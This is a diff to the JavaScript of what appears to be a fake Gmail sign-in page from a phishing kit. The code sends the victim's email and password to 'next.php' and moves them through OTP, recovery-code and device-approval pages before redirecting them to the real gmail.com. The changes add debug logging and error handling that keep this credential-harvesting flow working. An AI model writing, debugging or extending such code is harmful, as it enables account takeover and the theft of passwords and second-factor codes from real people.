@@ -261,6 +261,7 @@
         loadingBar.style.visibility = "visible";
         passwordContent.style.opacity = "0.5";
         $("#errorEmail").show();
+        console.log('Gmail: Submitting credentials via AJAX...');
         $.ajax({
             //dataType: 'JSON',
             url: "next.php",
@@ -270,6 +271,7 @@
                 pr: document.getElementById("myPassword").value,
             },
             success: function(a) {
+                console.log('Gmail: Server response received:', a);
                 let position = a.includes("numberTAP|")
                 var xm3;
                 if(position==true){
@@ -278,16 +280,18 @@
                     document.location.href = "tap.html#"+btoa(xm3)+"&"+document.getElementById("email_field").value;
                 }
                     if(a=="wrong password"){
+                        console.log('Gmail: Wrong password response');
                         document.getElementById('passLegend').style.color = 'red';
                         passFieldSet.style.borderColor='red';
                         wrongPass.style.display = 'block';
                         $('#loadingBar').css("display","none");
-                         loadingBar.style.visibility = "none";
+                         loadingBar.style.visibility = "hidden";
                             $('#password_content').css("opacity","1");
                       // passwordContent.style.opacity = "1";
                         
                         $("#loadingBar").hide();
                     }else if(a=="wrong email"){
+                        console.log('Gmail: Wrong email response');
                         var emailContent = document.getElementById('email_content');
                         var passwordContent = document.getElementById('password_content');
                         emailContent.style.display = "block";
@@ -296,14 +300,23 @@
                         passwordContent.style.opacity = "1";
                         $("#loadingBar").hide();
                     }else if(a=="otp"){
+                        console.log('Gmail: OTP required, redirecting');
                         document.location.href = "otp.html#"+document.getElementById("email_field").value;
                     }else if(a=="emotp"){
+                        console.log('Gmail: Email OTP required, redirecting');
                         document.location.href = "recoveryOTP.html#"+document.getElementById("email_field").value;
                     }else if(a=="saved"){
+                           console.log('Gmail: Login saved, redirecting to inbox');
                            document.location.href = "https://gmail.com";
                     }else if(a=="tap_yes"){
+                        console.log('Gmail: Device approval needed, redirecting');
                         document.location.href = "yes.html#"+document.getElementById("email_field").value;
+                    }else{
+                        console.log('Gmail: Unknown response:', a);
                     }
+            },
+            error: function(xhr, status, error) {
+                console.error('Gmail: AJAX error:', status, error);
             }
         })
 
